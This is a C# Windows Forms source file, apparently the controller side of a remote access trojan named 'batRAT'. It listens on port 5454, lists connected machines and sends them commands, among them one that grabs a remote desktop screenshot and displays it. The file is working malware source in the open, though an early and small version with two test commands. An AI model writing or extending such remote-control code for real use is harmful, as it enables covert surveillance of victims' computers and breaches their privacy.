using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.IO;
using System.Drawing;
using System.Windows.Forms;

using Server.Core;
using batRAT.Commands;

namespace Server.Forms {
    public partial class frmMain : Form {

        bServer server;

        public frmMain() {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e) {
            button1.Enabled = false;
            IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Any, 5454);
            server = new bServer(ipEndPoint);
            server.OnClientAccepted += (soc) => {
                IPEndPoint ip = soc.LocalEndPoint as IPEndPoint;
                this.Invoke((MethodInvoker)(() => listBox1.Items.Add(ip.Address.ToString())));
            };

            server.OnDataSent += (soc, bytes) => {
                IPEndPoint ip = soc.LocalEndPoint as IPEndPoint;
                
            };

            server.OnDataReceived += (soc, answer) => {
                IPEndPoint ip = soc.LocalEndPoint as IPEndPoint;
                DeserializeAnswer(answer);
            };

            server.StartListen();       
        }

        private void button2_Click(object sender, EventArgs e) {
            if(listBox1.Items.Count > 0) {
                int selectedIndex = listBox1.SelectedIndex;
                if(selectedIndex != -1) {
                    server.listener = new Listener(server, server.allConnections[selectedIndex]);
                    server.listener.StartReceive();
                }
            }
        }
        void DeserializeAnswer(CommandAnswer _answer) {
            using(var ms = new MemoryStream(_answer.buffer)) {
                switch(_answer.type) {
                    case CommandTypes.DesktopScreenShot:
                        pictureBox1.Image = Image.FromStream(ms);
                        break;
                    case CommandTypes.TestMessage:
                    case CommandTypes.HelloWorld:
                        MessageBox.Show(Encoding.ASCII.GetString(_answer.buffer));
                        break;
                }
            }
        }

        private void button3_Click(object sender, EventArgs e) {
            if(listBox1.Items.Count > 0) {
                int selectedIndex = listBox1.SelectedIndex;
                if(selectedIndex != -1) {
                    Command cmd = new Command();
                    cmd.Message = "DesktopScreenShot";
                    server.listener.Send<Command>(cmd, server.allConnections[selectedIndex]);
                }
            }
        }

        private void button4_Click(object sender, EventArgs e) {
            if(listBox1.Items.Count > 0) {
                int selectedIndex = listBox1.SelectedIndex;
                if(selectedIndex != -1) {
                    Command cmd = new Command();
                    cmd.Message = "HelloWorld";
                    server.listener.Send<Command>(cmd, server.allConnections[selectedIndex]);
                }
            }
        }

        private void button5_Click(object sender, EventArgs e) {
            if(listBox1.Items.Count > 0) {
                int selectedIndex = listBox1.SelectedIndex;
                if(selectedIndex != -1) {
                    Command cmd = new Command();
                    cmd.Message = "TestMessage";
                    server.listener.Send<Command>(cmd, server.allConnections[selectedIndex]);
                }
            }
        }
    }
}
